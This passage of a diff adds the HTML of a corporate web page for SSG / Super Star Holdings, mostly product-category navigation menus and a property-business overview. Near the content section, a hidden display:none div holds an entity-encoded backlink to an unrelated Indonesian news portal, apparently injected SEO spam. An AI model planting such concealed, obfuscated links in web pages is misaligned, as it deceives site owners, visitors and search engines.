+                                            Color dim
+                                        </li>
+                                        <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=led-color-lux&really_curr_tax=489-yith_product_brand"> Color led</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=motion-sensor-led&really_curr_tax=489-yith_product_brand"> Motion sensor</a>
+                                </h5>
+                            </div>
+                        </div>
+
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=panelux&really_curr_tax=489-yith_product_brand"> LED Panel LUX</a>
+                                </h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item"><a target="_new" href="super-star-holdings"> Surface Square</a></li>
+                                        <li class="list-group-item">
+                                            Surface Round
+                                        </li>
+                                        <li class="list-group-item">
+                                            Slim Square
+                                        </li>
+                                        <li class="list-group-item">
+                                            Slim Round
+                                        </li>
+                                        <li class="list-group-item">
+                                            Classic Panel
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=t-shape-led-bulb&really_curr_tax=489-yith_product_brand"> LED T SHAPE Bulb</a>
+                                </h5>
+                            </div>
+                        </div>
+
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-brands/super-star/?swoof=1&product_cat=eco-mega-lux&really_curr_tax=489-yith_product_brand"> ECO Mega</a>
+                                </h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-category/lightings/ac-led/t-shape-led-bulb/">
+                                        ECO T8 Tube
+                                    </a>
+                                </h5>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- a3 content end  -->
+                </div>
+                
+                <!-- Super Star Cables -->
+                <div class="tab-pane" id="a5" role="tabpanel">
+                    <!-- a5 content  -->
+                    <div class="card-columns">
+                        <div class="card border-0">
+                            <div class="card-body">
+                                <h5 class="card-title"><a target="_new" href="super-star-holdings#"> Indoor Wire</a></h5>
+                            </div>
+                        </div>
+                        
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title"> PVC Low voltage FR -Outdoor Cables</h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">XLPE Low Voltage FR Cables</h5>
+                            </div>
+                        </div>
+                        
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title"> Medium Voltage FR Cables</h5>
+                            </div>
+                        </div>
+                        
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title"> Communication Cables</h5>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- a5 content end  -->
+                </div>
+                <!-- End Super Star Cables -->
+                
+            </div>
+        </div>
+    </div>
+</div>                  <!-- //tab brand2 tab content -->
+                  <div class="row tab-pane" id="brand4" role="tabpanel">
+    <div class="row">
+        <div class="col-sm-3">
+            <ul class="nav brand-tabs" role="tablist">
+                <li class="nav-main-item">
+                    <a class="nav-link active" data-toggle="tab" href="super-star-holdings#d1" role="tab">
+                        <img class="img-fluid" src="https://staging.ssgbd.com/storage/app/media/main-menu-icons/orlee-led-light.png" />
+                        LED Light
+                    </a>
+                </li>
+                <li class="nav-main-item">
+                    <a class="nav-link" data-toggle="tab" href="super-star-holdings#d2" role="tab">
+                        <img class="img-fluid" src="https://staging.ssgbd.com/storage/app/media/main-menu-icons/orlee-incandescent-bulb.png" />
+                        Incandescent Bulb
+                    </a>
+                </li>
+            </ul>
+        </div>
+        <div class="col-sm-9">
+            <div class="tab-content">
+                <div class="tab-pane active" id="d1" role="tabpanel">
+                    <!-- d1 content  -->
+                    <div class="card-columns">
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-category/led-bulb/"> LED Bulb</a>
+                                </h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-category/lightings/ac-led/orlee-led/orlee-emergency-lamp/"> Emergency Bulb</a>
+                                </h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-category/lightings/ac-led/orlee-led/orlee-king-led/"> King LED</a>
+                                </h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-category/lightings/ac-led/orlee-led/bowling-led/"> Bowling LED</a>
+                                </h5>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    Panel Allrounder
+                                </h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-category/lightings/ac-led/orlee-panel/"> Round</a></li>
+                                        <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-category/lightings/ac-led/orlee-panel/"> Square</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    Tube Light
+                                </h5>
+                                <div class="card-text">
+                                    <ul class="list-group list-group-flush">
+                                        <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-category/lightings/ac-led/orlee-eco-ac-led-glass-tube/"> Eco T8 Tube</a></li>
+                                        <li class="list-group-item"><a target="_new" href="https://ssgeshop.com/product-category/lightings/ac-led/orlee-batten-tube/"> Batten T8 Tube</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="card border-0">
+                            <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+                            <div class="card-body">
+                                <h5 class="card-title">
+                                    <a target="_new" href="https://ssgeshop.com/product-category/lightings/ac-led/orlee-led/orlee-colorlux/"> Orlee Colorlux</a>
+                                </h5>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- d1 content end  -->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>                  <!-- //tab brand3 tab content -->
+                  <div
+     class="row tab-pane"
+     id="brand2"
+     role="tabpanel"
+     >
+  <div class="row">
+    <div class="col-sm-3">
+      <ul
+          class="nav brand-tabs"
+          role="tablist"
+          >
+        <li class="nav-main-item">
+          <a
+             class="nav-link active"
+             data-toggle="tab"
+             href="super-star-holdings#b1"
+             role="tab"
+             >
+             <img class="img-fluid" src="storage/app/media/main-menu-icons/root-accessories.png"/>
+             Accessories
+          </a
+            >
+        </li>
+        <li class="nav-main-item">
+          <a
+             class="nav-link"
+             data-toggle="tab"
+             href="super-star-holdings#b2"
+             role="tab"
+             >
+             <img class="img-fluid" src="storage/app/media/main-menu-icons/root-lighting.png"/>
+             Lighting
+          </a
+            >
+        </li>
+      </ul>
+    </div>
+    <div class="col-sm-9 ">
+      <div class="tab-content">
+        <div
+             class="tab-pane active"
+             id="b1"
+             role="tabpanel"
+             >
+          <!-- b1 content  -->
+          <div class="card-columns">
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                <a target="_new" href="https://ssgeshop.com/product-brands/roots/?swoof=1&product_cat=elegance-series&really_curr_tax=488-yith_product_brand">
+                  Gang Switch-Socket</a>
+                </h5>
+                <div class="card-text">
+                  <ul
+                      class="list-group list-group-flush"
+                      >
+                    <li
+                        class="list-group-item"
+                        ><a target="_new" href="https://ssgeshop.com/product-brands/roots/?swoof=1&product_cat=titanum-series&really_curr_tax=488-yith_product_brand">
+                      Elite Series</a>
+                    </li>
+                    <li
+                        class="list-group-item"
+                        >
+                        <a target="_new" href="https://ssgeshop.com/product-brands/roots/?swoof=1&product_cat=elegance-series&really_curr_tax=488-yith_product_brand">
+                      Elegance Series</a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                  Piano Switch-Socket
+                </h5>
+                <div class="card-text">
+                  <ul
+                      class="list-group list-group-flush"
+                      >
+                    <li
+                        class="list-group-item"
+                        ><a target="_new" href="https://ssgeshop.com/product-brands/roots/?swoof=1&product_cat=platinum-series&really_curr_tax=488-yith_product_brand">
+                      Platinum Series</a>
+                    </li>
+                    <li
+                        class="list-group-item"
+                        ><a target="_new" href="https://ssgeshop.com/product-brands/roots/?swoof=1&product_cat=titanum-series&really_curr_tax=488-yith_product_brand">
+                      Titanum Series</a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                  Others Piano Items
+                </h5>
+                <div class="card-text">
+                  <ul
+                      class="list-group list-group-flush"
+                      >
+                    <li
+                        class="list-group-item"
+                        >
+                      Ceiling Rose
+                    </li>
+                    <li
+                        class="list-group-item"
+                        >
+                      Holder
+                    </li>
+                    <li
+                        class="list-group-item"
+                        >
+                      Plug
+                    </li>
+                    <li
+                        class="list-group-item"
+                        >
+                      Socket
+                    </li>
+                    <li
+                        class="list-group-item"
+                        >
+                      Other Switches
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                <a target="_new" href="https://ssgeshop.com/product-brands/roots/?swoof=1&product_cat=circuit-breaker&really_curr_tax=488-yith_product_brand">
+                  Circuit Breaker</a>
+                </h5>
+              </div>
+            </div>
+          </div>
+          <!-- b1 content end  -->
+        </div>
+        <div
+             class="tab-pane"
+             id="b2"
+             role="tabpanel"
+             >
+          <!-- b2 content  -->
+          <div class="card-columns">
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                  <a target="_new" href="https://ssgeshop.com/product-brands/roots/?swoof=1&product_cat=gls-bulb&really_curr_tax=488-yith_product_brand">
+                  GLS Bulb</a>
+                </h5>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                <a target="_new" href="https://ssgeshop.com/product-brands/roots/?swoof=1&product_cat=ac-led&really_curr_tax=488-yith_product_brand">
+                  LED Bulb</a>
+                </h5>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    <a target="_new" href="https://ssgeshop.com/product-brands/roots/?swoof=1&product_cat=led-prime&really_curr_tax=488-yith_product_brand">
+                  Ultra LED Bulb</a>
+                </h5>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    <a target="_new" href="https://ssgeshop.com/product-brands/roots/?swoof=1&product_cat=mega-led-roots&really_curr_tax=488-yith_product_brand">
+                  LED Mega Lux Bulb</a>
+                </h5>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    <a target="_new" href="https://ssgeshop.com/product-brands/roots/?swoof=1&product_cat=emergency-bulb&really_curr_tax=488-yith_product_brand">
+                  LED Emergency Bulb</a>
+                </h5>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                  Tube Light - T8
+                </h5>
+              </div>
+            </div>
+          </div>
+          <!-- b2 content end  -->
+        </div>
+      </div>
+    </div>
+  </div>
+</div>                  <!-- //tab brand4 tab content -->
+                  <div
+     class="row tab-pane"
+     id="brand3"
+     role="tabpanel"
+     >
+  <div class="row">
+    <div class="col-sm-3">
+      <ul
+          class="nav brand-tabs"
+          role="tablist"
+          >
+        <li class="nav-main-item">
+          <a
+             class="nav-link active"
+             data-toggle="tab"
+             href="super-star-holdings#c1"
+             role="tab"
+             >
+             <img class="img-fluid" src="storage/app/media/main-menu-icons/blink-accessories.png"/>
+             Accessories
+          </a
+            >
+        </li>
+        <li class="nav-main-item">
+          <a
+             class="nav-link"
+             data-toggle="tab"
+             href="super-star-holdings#c2"
+             role="tab"
+             >
+             <img class="img-fluid" src="storage/app/media/main-menu-icons/blink-lighting.png"/>
+             Lighting
+          </a
+            >
+        </li>
+        <li class="nav-main-item">
+          <a
+             class="nav-link"
+             data-toggle="tab"
+             href="super-star-holdings#c3"
+             role="tab"
+             >
+             <img class="img-fluid" src="storage/app/media/main-menu-icons/blink-fan.png"/>
+             Fan
+          </a
+            >
+        </li>
+      </ul>
+    </div>
+    <div class="col-sm-9 ">
+      <div class="tab-content">
+        <div
+             class="tab-pane active"
+             id="c1"
+             role="tabpanel"
+             >
+          <!-- c1 content  -->
+          <div class="card-columns">
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=gang-switch-socket-accessories-blink&really_curr_tax=486-yith_product_brand">
+                  Gang Switch-Socket</a>
+                </h5>
+                <div class="card-text">
+                  <ul
+                      class="list-group list-group-flush"
+                      >
+                    <li
+                        class="list-group-item"
+                        ><a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=gang-switch-socket-accessories-blink&really_curr_tax=486-yith_product_brand">
+                      Exclusive Gold Series</a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                  Piano Switch-Socket
+                </h5>
+                <div class="card-text">
+                  <ul
+                      class="list-group list-group-flush"
+                      >
+                    <li
+                        class="list-group-item"
+                        >
+                          Exclusive Series - Ash
+                      
+                    </li>
+                    <li
+                        class="list-group-item"
+                        >
+                        <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=exclusive-switch-socket&pa_color=white-and-blue&really_curr_tax=486-yith_product_brand">
+                      Exclusive Series - Blue</a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=accessories-blink&really_curr_tax=486-yith_product_brand">
+                  Others Piano Items</a>
+                </h5>
+                <div class="card-text">
+                  <ul
+                      class="list-group list-group-flush"
+                      >
+                    <li
+                        class="list-group-item"
+                        >
+                        <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=ceiling-rose-accessories-blink&really_curr_tax=486-yith_product_brand">
+                      Ceiling Rose</a>
+                    </li>
+                    <li
+                        class="list-group-item"
+                        ><a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=pendant-holder&really_curr_tax=486-yith_product_brand">
+                      Holder</a>
+                    </li>
+                    <li
+                        class="list-group-item"
+                        >
+                      Plug
+                    </li>
+                    <li
+                        class="list-group-item"
+                        >
+                      Socket
+                    </li>
+                    <li
+                        class="list-group-item"
+                        >
+                        <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=exclusive-switch-socket&really_curr_tax=486-yith_product_brand">
+                      Other Switches</a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=circuit-breaker&really_curr_tax=486-yith_product_brand">
+                  Circuit Breaker</a>
+                </h5>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=pvc-tape&really_curr_tax=486-yith_product_brand">
+                  PVC Tape</a>
+                </h5>
+              </div>
+            </div>
+          </div>
+          <!-- c1 content end  -->
+        </div>
+        <div
+             class="tab-pane"
+             id="c2"
+             role="tabpanel"
+             >
+          <!-- c2 content  -->
+          <div class="card-columns">
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=lightings&really_curr_tax=486-yith_product_brand">
+                  GLS Bulb</a>
+                </h5>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=basic-led&really_curr_tax=486-yith_product_brand">
+                  BASIC LED</a>
+                </h5>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=dim-light&really_curr_tax=486-yith_product_brand">
+                  Dim Light</a>
+                </h5>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=emergency-led&really_curr_tax=486-yith_product_brand">
+                  Emergency LED</a>
+                </h5>
+              </div>
+            </div>
+          </div>
+          <!-- c2 content end  -->
+        </div>
+        <div
+             class="tab-pane"
+             id="c3"
+             role="tabpanel"
+             >
+          <!-- c3 content  -->
+          <div class="card-columns">
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=ceiling-fan&really_curr_tax=486-yith_product_brand">
+                  Ceiling Fan</a>
+                </h5>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                    
+                  Stormy Fan
+                </h5>
+              </div>
+            </div>
+            <div class="card border-0">
+              <!-- <img class="card-img-top" src="..." alt="Card image cap"> -->
+              <div class="card-body">
+                <h5 class="card-title">
+                <a target="_new" href="https://ssgeshop.com/product-brands/blink/?swoof=1&product_cat=net-fan&really_curr_tax=486-yith_product_brand">
+                  Net Fan</a>
+                </h5>
+              </div>
+            </div>
+          </div>
+          <!-- c3 content end  -->
+        </div>
+      </div>
+    </div>
+  </div>
+</div>                  <!-- //tab brand5 tab content -->
+                  <div
+     class="row tab-pane"
+     id="brand5"
+     role="tabpanel"
+     >
+  <div class="row">
+    <div class="col-sm-3">
+      <ul
+          class="nav brand-tabs"
+          role="tablist"
+          >
+        <li class="nav-main-item">
+          <a
+             class="nav-link active"
+             
+            
+             role="tab"
+             target="_new" href="https://ssgeshop.com/product-brands/super-touch-tissue/?swoof=1&product_cat=tissue&really_curr_tax=491-yith_product_brand">
+             
+             <img class="img-fluid" src="storage/app/media/main-menu-icons/super-touch-tissue.png"/>
+             Tissue
+          </a
+            >
+        </li>
+        
+      </ul>
+    </div>
+    <div class="col-sm-9 ">
+      <div class="tab-content">
+        
+        
+      </div>
+    </div>
+  </div>
+</div>                  
+                </div>
+                <!-- Second lavel dropdown end-->
+                
+              </div>
+            </div>
+          </div>
+        </div>
+      </li>
+      <li class="nav-item dropdown ">
+        <a
+           id="dropdownBusinessUnits"
+           href="super-star-holdings#"
+           data-toggle="dropdown"
+           class="nav-link dropdown-toggle"
+           >Business Unit
+        </a
+          >
+        <div class="dropdown-menu">
+          <a class="dropdown-item" href="super-star-electrical-accessories-limited"
+             >Super Star Electrical Accessories Limited
+          </a>
+          <a class="dropdown-item" href="super-star-cables"
+             >Super Star Cables
+          </a>
+          <a class="dropdown-item" href="super-star-electronics-limited"
+             >Super Star Electronics Limited
+          </a>
+          <a class="dropdown-item" href="super-star-fan-limited"
+             >Super Star Fan Limited
+          </a
+            >
+          <a class="dropdown-item" href="ir-bulb-co-limited"
+             >IR Bulb Co Limited
+          </a
+            >
+          <!-- <a class="dropdown-item" href="https://www.ssgbd.com/professional-lightings"
+             >Professional Lighting
+          </a
+            > -->
+          <!-- <a class="dropdown-item" href="https://www.ssgbd.com/ssg-engineering"
+             >SSG Engineering
+          </a
+            > -->
+          <a class="dropdown-item" href="super-star-renewable-energy-limited"
+             >Super Star Renewable Energy Limited
+          </a
+            >
+          <a class="dropdown-item" href="super-star-distribution-limited"
+             >Super Star Distribution Limited
+          </a
+            >
+          <a class="dropdown-item" href="super-star-holdings"
+             >SSG Holdings
+          </a
+            >
+          <a class="dropdown-item" href="ssg-elevator"
+             >SSG Elevator
+          </a
+            >
+          <!-- <a class="dropdown-item" href="https://www.ssgbd.com/grupel-generator"
+             >SSG Generator
+          </a
+            > -->
+          <a class="dropdown-item" href="ssg-agro"
+             >SSG Agro
+          </a
+            >
+          <a class="dropdown-item" href="ssg-papers-ltd"
+             >SSG Paper Limited
+          </a>
+          
+          <!-- <a class="dropdown-item" href="/3r"
+             >SSG 3R Limited
+          </a> -->
+          <!-- <a
+             class="dropdown-item"
+             target="_new"
+             href="https://mistrimama.com/"
+             >Mistri Mama
+          </a>  -->
+          <a class="dropdown-item" target="_new" href="https://bizzsol.com.bd/"
+             >BIZZ SOLUTIONS LTD.
+          </a>
+          <a class="dropdown-item" href="ssg-global">SSG Global
+          </a>
+        </div>
+      </li>
+      <li class="nav-item dropdown ">
+        <a
+           id="dropdownMediaCornar"
+           href="super-star-holdings#"
+           data-toggle="dropdown"
+           class="nav-link dropdown-toggle"
+           >Media Corner
+        </a
+          >
+         <ul class="dropdown-menu">
+                                                                <li class="dropdown-item"><a href="awards-achievements">Awards & Achievements
+                         </a></li>
+                                                                <li class="dropdown-item" id="dropdownMediaCornar-s">
+                                                                    <a href="super-star-holdings#" data-toggle="dropdown" class="nav-link dropdown-toggle" href="media-center">Media Center
+                         </a>
+                                                                    <ul class="third-level-submenu">
+                                                                        <li class="dropdown-item"><a href="tvc-av">TVC & AV
+</a></li>
+                                                                        <li class="dropdown-item"><a href="press-ad">Press Ad
+                                                                    </ul>
+
+                                                                </li>
+                                                                <li class="dropdown-item"><a href="news-events">News & Events
+                         </a></li>
+
+                                                                    </ul>
+      </li>
+      <li class="nav-item">
+        <a class="nav-link" target="_new" href="https://ssgeshop.com">eShop
+        </a>
+      </li>
+      <li class="nav-item ">
+        <a class="nav-link" href="career">Career
+        </a>
+      </li>
+      <li class="nav-item ">
+        <a class="nav-link" href="contact">Contact us
+        </a>
+      </li>
+    </ul>
+    
+  </div>
+</nav>            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- Search Popup-->
+<div style="display: none;" class="g-search" id="g-search">
+<script async src="https://cse.google.com/cse.js?cx=016120151646906232823:nac28eakd8s"></script>
+<div class="gcse-search"></div>
+</div>    </section>
+
+    <!-- Content -->
+    <div style="display:none"><p>Portal Berita Terbaru Wewara <a href='&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#119;&#101;&#119;&#97;&#114;&#97;&#46;&#119;&#101;&#98;&#46;&#105;&#100;&#47;' title='Wewara.web.id - Portal Berita Terbaru Wewara' rel='dofollow' target='_blank'>Wewara.web.id - Portal Berita Terbaru Wewara</a></p></div>
+    <section id="layout-content" >
+        <section id="main-banner" style="background-image: url(storage/app/media/units/SUPER%20STAR%20PROPERTIES/SSG%20PROPERTIES%2003.jpg)"  data-aos="fade-up">
+    <div class="container">
+        <div class="row align-items-center sectionFullHeight">
+            <div class="col">
+                <h1>SSG HOLDINGS.</h1>
+                <h5 class="title">
+                   Committed to Building Your Dream, Making Your Future Secured
+                </h5>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- main banner end  -->
+<!-- Our business intro section -->
+<section id="business-into"  data-aos="fade-up">
+    <div class="container">
+        <div class="row  align-items-center sectionFullHeight">
+            <div class="col-sm-6">
+                <img class="img-fluid" src="storage/app/media/units/SUPER%20STAR%20PROPERTIES/9-SSG-PROPERTIES.png" alt="" />
+            </div>
+            <div class="col-sm-6">
+                <h5 class="title">Overview</h5>
+                <h2 class="mb-8">About Super Star Holdings.</h2>
+                <p class="mt-8">
+                Here at Super Star holdings, we understand your need for the perfect home. That will full fil your
+need safety &amp; security; give you a place where you can come back to your loved ones, the place of
+your comfort, the place of your peace. And all these in a price that is affordable by you. That is what
+we are here to deliver. Your perfect home, at the perfect price for you. Making sure everything you
+have is exactly what you have wanted.
+                </p>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- Our business into end  -->
+<!-- Our mission section -->
+<section id="mission"  data-aos="fade-up">
+    <div class="container">
+        <div class="row  align-items-center sectionFullHeight">
+            <div class="col-sm-6 mission-statement" style="background-image: url(storage/app/media/business-thumb/inner-content/properties/1.jpg)">
+               
+                <h3 class="mb-8">
+               Making <br>lives better
+                </h3>
+                <p class="short-desc mt-8">
+                  Constructing your future home on brick at a time, ensuring safety and security for you
+and the next generation.
+                </p>
+            </div>
+            <div class="col-sm-3">
+                <img class="img-fluid margin-overlap" src="storage/app/media/business-thumb/inner-content/properties/2.jpg" alt="" />
+            </div>
+            <div class="col-sm-3">
+                <img class="img-fluid topalign" src="storage/app/media/business-thumb/inner-content/properties/3.jpg" alt="" />
+            </div>
+        </div>
+    </div>
+</section>
+<!-- Our Mission end  -->
+
+
+
+<!-- products unit  -->
+<section id="business-unit-products">
+    <div class="container">
+        <div class="row  align-items-center sectionFullHeight">
+            <div class="col">
+                <h2>Projects</h2>
+                <div id="businessUnitCarousel" class="carousel slide" data-ride="carousel"  data-aos="zoom-in">
+                    
+                    <div class="carousel-inner">
+                        
+                        <div class="carousel-item active">
+                            <div class="row">
+                                <div class="col-sm-4">
+                                    <img class="slide-item animated zoomInRight" src="storage/app/media/business-thumb/inner-content/properties/4.jpg" alt="Los Angeles" width="300" />
+                                  
+                                </div>
+                                <div class="col-sm-4">
+                                    <img class="slide-item animated zoomInRight"  src="storage/app/media/business-thumb/inner-content/properties/5.jpg" alt="Los Angeles" width="300" />
+                                  
+                                </div>
+                                <div class="col-sm-4">
+                                    <img class="slide-item animated zoomInRight" src="storage/app/media/business-thumb/inner-content/properties/6.jpg" alt="Los Angeles" width="300" />
+                                  
+                                </div>
+                            </div>
+                        </div>
+                        
+                        
+                    </div>
+
+                    <a class="carousel-control-prev" href="super-star-holdings#businessUnitCarousel">
+                        <span class="carousel-control-prev-icon"></span>
+                    </a>
+                    <a class="carousel-control-next" href="super-star-holdings#businessUnitCarousel">
+                        <span class="carousel-control-next-icon"></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!-- end products unit  -->    </section>
+    <!-- Newsletter -->
+    <div class="download-newsletter" data-aos="fade-up">
+        <!-- Newsletter  section -->
+        <section
+        id="newsletter" style="background-image: url(themes/ssg/assets/images/download/download-bg.jpg);"> 
+          <div class="container-fluid">
+            <div class="row  align-items-center sectionHalfHeight">
+              <div class="col">
+                <div class="container">
+                  <div class="row">
+                    <div class="col">
+                      <div class="newletter">
+                        <h2>
+                          Download<br />
+                          E-Catalogues
+                        </h2>
+                        <p class="title">TO GET DETAIL PRODUCT AND ESSENTIAL COMPANY INFORMATION<br><br><br>
+                          <a href="download-e-catalogues" class="submit-btn align-items-center"/>View All</a></div>
+
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            </div>
+        </section>
+      <!-- Newsletter section end-->    </div>
+    <!-- Footer -->
+        <footer class="page-footer font-small mdb-color pt-4" data-aos="fade-up">
+            <!-- Footer Section start  -->
+      <!-- Footer -->
+      
+        <!-- Footer Links -->
